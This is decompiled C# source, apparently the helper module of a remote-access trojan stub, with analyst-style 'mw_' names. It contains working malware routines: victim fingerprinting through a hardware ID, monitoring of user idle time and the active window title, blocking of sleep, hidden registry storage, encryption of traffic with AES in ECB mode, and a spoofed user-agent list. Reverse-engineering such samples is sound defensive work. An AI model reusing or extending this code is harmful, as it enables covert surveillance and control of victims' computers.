using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace Stub
{
	// Token: 0x02000012 RID: 18
	[StandardModule]
	internal sealed class mw_Handler
	{
		// Token: 0x060000B1 RID: 177
		[DllImport("SHCore.dll", SetLastError = true)]
		public static extern int SetProcessDpiAwareness([In] int value);

		// Token: 0x060000B2 RID: 178 RVA: 0x0000644C File Offset: 0x0000464C
		public static bool mw_isValidHostname(string X4f1AWlHdSD4c3mHIipbKl6F)
		{
			return Uri.CheckHostName(X4f1AWlHdSD4c3mHIipbKl6F) != UriHostNameType.Unknown;
		}

		// Token: 0x060000B3 RID: 179
		public static string mw_getRandomLowercaseLetters(int length)
		{
			StringBuilder stringBuilder = new StringBuilder(length);
			int num = 0;
			checked
			{
				int num2 = length - 1;
				for (int i = num; i <= num2; i++)
				{
					stringBuilder.Append("abcdefghijklmnopqrstuvwxyz"[mw_Handler.mw_random.Next("abcdefghijklmnopqrstuvwxyz".Length)]);
				}
				return stringBuilder.ToString();
			}
		}

		// Token: 0x060000B4 RID: 180
		[DllImport("user32.dll")]
		public static extern bool GetLastInputInfo(out mw_Handler.LASTINPUTINFO plii);

		// Token: 0x060000B5 RID: 181
		public static int mw_getSecondsSinceLastUserInput()
		{
			mw_Handler.mw_ticker = 0;
			mw_Handler.mw_lastInputInfo.cbSize = Marshal.SizeOf<mw_Handler.LASTINPUTINFO>(mw_Handler.mw_lastInputInfo);
			mw_Handler.mw_lastInputInfo.dwTime = 0;
			checked
			{
				if (mw_Handler.GetLastInputInfo(out mw_Handler.mw_lastInputInfo))
				{
					mw_Handler.mw_ticker = Environment.TickCount - mw_Handler.mw_lastInputInfo.dwTime;
				}
				int result;
				if (mw_Handler.mw_ticker > 0)
				{
					result = (int)Math.Round((double)mw_Handler.mw_ticker / 1000.0);
				}
				else
				{
					result = 0;
				}
				return result;
			}
		}

		// Token: 0x060000B6 RID: 182
		public static object mw_trackIdleTime()
		{
			for (;;)
			{
				Thread.Sleep(1000);
				int num = mw_Handler.mw_getSecondsSinceLastUserInput();
				if (mw_Handler.mw_lastUserInputTime > num)
				{
					mw_Handler.mw_timestamp = mw_Handler.mw_timestamp.Add(TimeSpan.FromSeconds((double)mw_Handler.mw_lastUserInputTime));
				}
				else
				{
					mw_Handler.mw_str = Conversions.ToString(mw_Handler.mw_getSecondsSinceLastUserInput());
				}
				mw_Handler.mw_lastUserInputTime = num;
			}
			object result;
			return result;
		}

		// Token: 0x060000B7 RID: 183
		[DllImport("user32.dll")]
		public static extern IntPtr GetForegroundWindow();

		// Token: 0x060000B8 RID: 184
		[DllImport("user32.dll")]
		public static extern int GetWindowText([In] IntPtr hWnd, [Out] StringBuilder lpString, [In] int nMaxCount);

		// Token: 0x060000B9 RID: 185
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern mw_Handler.EXECUTION_STATE SetThreadExecutionState(mw_Handler.EXECUTION_STATE esFlags);

		// Token: 0x060000BA RID: 186 RVA: 0x00006598 File Offset: 0x00004798
		public static void mw_preventSleep()
		{
			try
			{
				mw_Handler.SetThreadExecutionState((mw_Handler.EXECUTION_STATE)2147483651U);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060000BB RID: 187 RVA: 0x000065D0 File Offset: 0x000047D0
		public static string mw_getWindowText()
		{
			try
			{
				StringBuilder stringBuilder = new StringBuilder(256);
				IntPtr foregroundWindow = mw_Handler.GetForegroundWindow();
				if (mw_Handler.GetWindowText(foregroundWindow, stringBuilder, 256) > 0)
				{
					return stringBuilder.ToString();
				}
			}
			catch (Exception ex)
			{
			}
			return "";
		}

		// Token: 0x060000BC RID: 188 RVA: 0x00006630 File Offset: 0x00004830
		public static byte[] mw_stringToBytes(string value)
		{
			return Encoding.UTF8.GetBytes(value);
		}

		// Token: 0x060000BD RID: 189 RVA: 0x0000664C File Offset: 0x0000484C
		public static string mw_convertByteArrayToString(byte[] value)
		{
			return Encoding.UTF8.GetString(value);
		}

		// Token: 0x060000BE RID: 190 RVA: 0x00006668 File Offset: 0x00004868
		public static string mw_getHWID()
		{
			string result;
			try
			{
				result = mw_Handler.mw_computeMd5Hash(string.Concat(new object[]
				{
					Environment.ProcessorCount,
					Environment.UserName,
					Environment.MachineName,
					Environment.OSVersion,
					new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize
				}));
			}
			catch (Exception ex)
			{
				result = "Err HWID";
			}
			return result;
		}

		// Token: 0x060000BF RID: 191 RVA: 0x000066F8 File Offset: 0x000048F8
		public static string mw_computeMd5Hash(string value)
		{
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			byte[] array = Encoding.ASCII.GetBytes(value);
			array = md5CryptoServiceProvider.ComputeHash(array);
			StringBuilder stringBuilder = new StringBuilder();
			foreach (byte b in array)
			{
				stringBuilder.Append(b.ToString("x2"));
			}
			return stringBuilder.ToString().Substring(0, 20).ToUpper();
		}

		// Token: 0x060000C0 RID: 192 RVA: 0x0000676C File Offset: 0x0000496C
		public static bool mw_setRegistryKey(string name, byte[] value)
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(mw_Handler.mw_subkey, RegistryKeyPermissionCheck.ReadWriteSubTree))
				{
					registryKey.SetValue(name, value, RegistryValueKind.Binary);
					return true;
				}
			}
			catch (Exception ex)
			{
			}
			return false;
		}

		// Token: 0x060000C1 RID: 193 RVA: 0x000067D4 File Offset: 0x000049D4
		public static byte[] mw_getSubkeyValue(string subkeyName)
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(mw_Handler.mw_subkey))
				{
					object objectValue = RuntimeHelpers.GetObjectValue(registryKey.GetValue(subkeyName));
					return (byte[])objectValue;
				}
			}
			catch (Exception ex)
			{
			}
			return null;
		}

		// Token: 0x060000C2 RID: 194 RVA: 0x00006844 File Offset: 0x00004A44
		public static byte[] mw_decompressGZIPByteArray(byte[] gzipData)
		{
			byte[] result;
			using (object obj = new MemoryStream(gzipData))
			{
				byte[] array = new byte[4];
				object instance = obj;
				Type type = null;
				string memberName = "Read";
				object[] array2 = new object[]
				{
					array,
					0,
					4
				};
				object[] arguments = array2;
				string[] argumentNames = null;
				Type[] typeArguments = null;
				bool[] array3 = new bool[]
				{
					true,
					false,
					false
				};
				NewLateBinding.LateCall(instance, type, memberName, arguments, argumentNames, typeArguments, array3, true);
				if (array3[0])
				{
					array = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(byte[]));
				}
				object obj2 = BitConverter.ToInt32(array, 0);
				using (object obj3 = new GZipStream((Stream)obj, 0))
				{
					object obj4 = new byte[checked(Conversions.ToInteger(Operators.SubtractObject(obj2, 1)) + 1)];
					object instance2 = obj3;
					Type type2 = null;
					string memberName2 = "Read";
					object[] array4 = new object[]
					{
						RuntimeHelpers.GetObjectValue(obj4),
						0,
						RuntimeHelpers.GetObjectValue(obj2)
					};
					object[] arguments2 = array4;
					string[] argumentNames2 = null;
					Type[] typeArguments2 = null;
					array3 = new bool[]
					{
						true,
						false,
						true
					};
					NewLateBinding.LateCall(instance2, type2, memberName2, arguments2, argumentNames2, typeArguments2, array3, true);
					if (array3[0])
					{
						obj4 = RuntimeHelpers.GetObjectValue(array4[0]);
					}
					if (array3[2])
					{
						obj2 = RuntimeHelpers.GetObjectValue(array4[2]);
					}
					result = (byte[])obj4;
				}
			}
			return result;
		}

		// Token: 0x060000C3 RID: 195 RVA: 0x000069E4 File Offset: 0x00004BE4
		public static byte[] mw_compressByteArrayToGZIP(byte[] value)
		{
			byte[] result;
			using (object obj = new MemoryStream())
			{
				object obj2 = BitConverter.GetBytes(value.Length);
				object instance = obj;
				Type type = null;
				string memberName = "Write";
				object[] array = new object[]
				{
					RuntimeHelpers.GetObjectValue(obj2),
					0,
					4
				};
				object[] arguments = array;
				string[] argumentNames = null;
				Type[] typeArguments = null;
				bool[] array2 = new bool[]
				{
					true,
					false,
					false
				};
				NewLateBinding.LateCall(instance, type, memberName, arguments, argumentNames, typeArguments, array2, true);
				if (array2[0])
				{
					obj2 = RuntimeHelpers.GetObjectValue(array[0]);
				}
				using (object obj3 = new GZipStream((Stream)obj, 1))
				{
					object instance2 = obj3;
					Type type2 = null;
					string memberName2 = "Write";
					object[] array3 = new object[]
					{
						value,
						0,
						value.Length
					};
					object[] arguments2 = array3;
					string[] argumentNames2 = null;
					Type[] typeArguments2 = null;
					array2 = new bool[]
					{
						true,
						false,
						false
					};
					NewLateBinding.LateCall(instance2, type2, memberName2, arguments2, argumentNames2, typeArguments2, array2, true);
					if (array2[0])
					{
						value = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array3[0]), typeof(byte[]));
					}
					NewLateBinding.LateCall(obj3, null, "Flush", new object[0], null, null, null, true);
				}
				result = (byte[])NewLateBinding.LateGet(obj, null, "ToArray", new object[0], null, null, null);
			}
			return result;
		}

		// Token: 0x060000C4 RID: 196 RVA: 0x00006B74 File Offset: 0x00004D74
		public static byte[] mw_encryptByteArrayToAES(byte[] 4kRfjpLJSYObKlFJu8H3idbHqdUfSiBpaBy039aFrdJF6g6yVTDOanA4)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			byte[] result;
			try
			{
				rijndaelManaged.Key = md5CryptoServiceProvider.ComputeHash(mw_Handler.mw_stringToBytes(mw_config.mw_AESKey));
				rijndaelManaged.Mode = CipherMode.ECB;
				ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
				result = cryptoTransform.TransformFinalBlock(4kRfjpLJSYObKlFJu8H3idbHqdUfSiBpaBy039aFrdJF6g6yVTDOanA4, 0, 4kRfjpLJSYObKlFJu8H3idbHqdUfSiBpaBy039aFrdJF6g6yVTDOanA4.Length);
			}
			catch (Exception ex)
			{
			}
			return result;
		}

		// Token: 0x060000C5 RID: 197 RVA: 0x00006BE8 File Offset: 0x00004DE8
		public static byte[] mw_decryptByteArrayFromAES(byte[] IFYi30ezQMN8YIww1kza0CqWQnSt8T63ffTz4cR6mHEboEvJiC0dM6K3)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			byte[] result;
			try
			{
				rijndaelManaged.Key = md5CryptoServiceProvider.ComputeHash(mw_Handler.mw_stringToBytes(mw_config.mw_AESKey));
				rijndaelManaged.Mode = CipherMode.ECB;
				ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
				result = cryptoTransform.TransformFinalBlock(IFYi30ezQMN8YIww1kza0CqWQnSt8T63ffTz4cR6mHEboEvJiC0dM6K3, 0, IFYi30ezQMN8YIww1kza0CqWQnSt8T63ffTz4cR6mHEboEvJiC0dM6K3.Length);
			}
			catch (Exception ex)
			{
			}
			return result;
		}

		// Token: 0x060000C6 RID: 198 RVA: 0x00006C5C File Offset: 0x00004E5C
		public static bool mw_createNamedMutex()
		{
			bool result;
			mw_Handler.mw_mutex = new Mutex(false, mw_config.mw_mutexName, ref result);
			return result;
		}

		// Token: 0x060000C7 RID: 199 RVA: 0x0000236C File Offset: 0x0000056C
		public static void mw_closeMutex()
		{
			if (mw_Handler.mw_mutex != null)
			{
				mw_Handler.mw_mutex.Close();
				mw_Handler.mw_mutex = null;
			}
		}

		// Token: 0x0400002C RID: 44
		public static bool mw_bool = false;

		// Token: 0x0400002D RID: 45
		public static FileStream mw_filestream;

		// Token: 0x0400002E RID: 46
		private const string mw_lowercaseAlphabet = "abcdefghijklmnopqrstuvwxyz";

		// Token: 0x0400002F RID: 47
		public static Random mw_random = new Random();

		// Token: 0x04000030 RID: 48
		public static readonly string mw_subkey = "Software\\" + mw_Handler.mw_getHWID();

		// Token: 0x04000031 RID: 49
		public static string mw_currentProcessFilename = Process.GetCurrentProcess().MainModule.FileName;

		// Token: 0x04000032 RID: 50
		private static int mw_ticker;

		// Token: 0x04000033 RID: 51
		private static mw_Handler.LASTINPUTINFO mw_lastInputInfo = default(mw_Handler.LASTINPUTINFO);

		// Token: 0x04000034 RID: 52
		public static TimeSpan mw_timestamp = new TimeSpan(0L);

		// Token: 0x04000035 RID: 53
		public static int mw_lastUserInputTime;

		// Token: 0x04000036 RID: 54
		public static string mw_str;

		// Token: 0x04000037 RID: 55
		public static string[] mw_userAgentList = new string[]
		{
			"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
			"Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
		};

		// Token: 0x04000038 RID: 56
		public static Mutex mw_mutex;

		// Token: 0x02000013 RID: 19
		public struct LASTINPUTINFO
		{
			// Token: 0x04000039 RID: 57
			[MarshalAs(UnmanagedType.U4)]
			public int cbSize;

			// Token: 0x0400003A RID: 58
			[MarshalAs(UnmanagedType.U4)]
			public int dwTime;
		}

		// Token: 0x02000014 RID: 20
		public enum EXECUTION_STATE : uint
		{
			// Token: 0x0400003C RID: 60
			ES_CONTINUOUS = 2147483648U,
			// Token: 0x0400003D RID: 61
			ES_DISPLAY_REQUIRED = 2U,
			// Token: 0x0400003E RID: 62
			ES_SYSTEM_REQUIRED = 1U
		}
	}
}
